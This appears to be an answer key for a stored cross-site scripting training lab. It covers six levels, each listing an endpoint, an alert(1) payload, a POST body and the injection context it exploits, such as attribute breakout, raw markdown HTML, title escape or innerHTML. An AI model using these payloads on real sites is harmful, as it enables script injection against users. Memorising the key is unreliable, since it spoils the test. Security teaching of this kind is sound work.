# storedpat — solutions

Realistic stored XSS shapes (comments, bios, reviews, chat, tickets, admin notes) reflected via POST then GET.

### storedpat-level1

`[POST] /storedpat/level1/`

- payload: `" onmouseover=alert(1) x="`
- body: `body=" onmouseover=alert(1) x="`
- context: body HTML-escaped, but raw inside `title="..."` attribute

### storedpat-level2

`[POST] /storedpat/level2/`

- payload: `<img src=x onerror=alert(1)>`
- body: `bio=<img src=x onerror=alert(1)>`
- context: markdown renderer passes raw HTML through into section body

### storedpat-level3

`[POST] /storedpat/level3/`

- payload: `"><script>alert(1)</script>`
- body: `review="><script>alert(1)</script>`
- context: raw inside `<meta og:description content="...">` — break attr

### storedpat-level4

`[POST] /storedpat/level4/`

- payload: `<img src=x onerror=alert(1)>`
- body: `msg=<img src=x onerror=alert(1)>`
- context: each stored message inserted raw into `<div class='msg'>`

### storedpat-level5

`[POST] /storedpat/level5/`

- payload: `</title><svg onload=alert(1)>`
- body: `subject=</title><svg onload=alert(1)>`
- context: subject raw in `<title>` and `<h1>` — close title to escape RCDATA

### storedpat-level6

`[POST] /storedpat/level6/`

- payload: `<img src=x onerror=alert(1)>`
- body: `note=<img src=x onerror=alert(1)>`
- context: POST stored, GET /api returns JSON, page does innerHTML on `d.note`
